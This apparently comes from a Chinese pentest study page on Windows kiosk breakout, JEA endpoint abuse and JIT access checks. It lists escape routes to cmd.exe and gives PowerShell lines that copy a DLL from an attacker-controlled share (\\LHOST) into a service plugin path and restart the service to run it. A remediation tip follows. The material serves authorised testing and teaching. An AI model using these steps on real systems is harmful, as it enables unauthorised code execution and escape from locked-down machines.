# Kiosk、JEA、JIT

::: warning 仅供学习 / 授权实验
:::

## Kiosk 通道（低到高）

1. Alt+Tab / Alt+F4 / Win / Ctrl+Shift+Esc  
2. IE 地址栏 `file:///C:/Windows/System32/cmd.exe`（现代 Chrome 只会下载）  
3. 打开/另存为/打印 PDF：地址栏进 `C:\Windows\System32`，再回车 `cmd.exe`  
4. 帮助 `.chm`、Win+U、屏幕键盘  
5. 任务管理器 → 文件 → 运行新任务  

突破后是 kiosk 用户。提权走 [Windows 提权](/topics/windows-privesc)。

## JEA

端点里列出真正允许的命令。若 `Copy-Item` 能写到服务会加载的路径：

```powershell
Copy-Item \\LHOST\share\lab.dll C:\ProgramData\App\plugin.dll
Restart-Service AppService
```

修复侧：限制目的路径，不要只白名单 cmdlet 名。

## JIT

```powershell
whoami /groups
klist
# 窗口内只跑事先写好的命令
klist purge   # 窗口结束后若票还在，记进报告
```
